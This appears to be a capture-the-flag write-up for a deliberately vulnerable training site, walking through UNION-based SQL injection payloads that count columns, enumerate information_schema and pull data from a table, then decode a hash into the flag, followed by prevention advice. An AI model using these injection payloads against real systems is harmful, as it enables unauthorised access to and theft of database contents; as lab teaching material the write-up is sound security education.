SQL Injection Exploit Guide

1. Determine the Number of Columns

Start by testing if there is one column in the table using the following SQL injection:

42 UNION SELECT null

If the response is "The used SELECT statements have a different number of columns," it indicates that there are more columns.

Next, test for two columns:

42 UNION SELECT null, null;

This query returns results so it confirms that there are two columns.

2. Retrieve Table Schema and Types

Now, let's find out the schema and types of the tables:

42 UNION SELECT table_schema, table_type FROM information_schema.tables

From this query, we find that the schemas with base tables (that holds data) are: Member_Brute_Force, Member_Sql_Injection, Member_guestbook, and Member_images.

3. Identify Table Names in Each Schema

To find the table names in each schema

42 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.columns

If we exclude the results related to "information_schema" which is not a base table data we have : Member_Brute_Force/db_default, Member_Sql_Injection/users, Member_guestbook/guestbook, Member_images/list_images, and Member_survey/vote_dbs.

In this case, we will focus on the list_images table in the Member_images schema.

4. Find Column Names in Tables

To retrieve the column names in each table, use:

42 UNION SELECT table_name, column_name FROM information_schema.columns

5. Extract Data from Member_images.list_images Table

Check for "id" and "url" columns in the Member_images.list_images table:

42 UNION SELECT id, url FROM Member_images.list_images

Next, check for "title" and "comment" columns in the same table:

42 UNION SELECT title, comment FROM Member_images.list_images

6. Decode the Final Flag

The last query returns:

ID: 42 UNION SELECT title, comment FROM Member_images.list_images 
First name: Hack me?
Surname: If you read this, use MD5 decoding (lowercase) and then SHA256 to obtain the flag: 1928e8083cf461a51303633093573c46

Decoding the MD5 hash "1928e8083cf461a51303633093573c46" gives you "albatroz". Hashing "albatroz" with SHA256 yields the final flag:

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Prevention:
1. Use Prepared Statements: Always use prepared statements or parameterized queries to separate SQL code from data.
2. Employ ORM Libraries: Use Object-Relational Mapping (ORM) tools to handle SQL interactions securely.
3. Escape User Inputs: Properly escape any user input before using it in SQL queries if prepared statements are not an option.
4. Validate and Sanitize Inputs: Validate user inputs against expected formats and sanitize to remove harmful characters.
5. Limit Database Privileges: Use the principle of least privilege for database access; restrict permissions as much as possible.
6. Error Handling: Display generic error messages to users and log detailed errors securely.
7. Regular Updates: Keep your DBMS and libraries up-to-date to protect against known vulnerabilities.

Ressources:
https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/
https://www.mssqltips.com/sqlservertutorial/183/information-schema-columns/
https://10015.io/tools/md5-encrypt-decrypt
https://10015.io/tools/sha256-encrypt-decrypt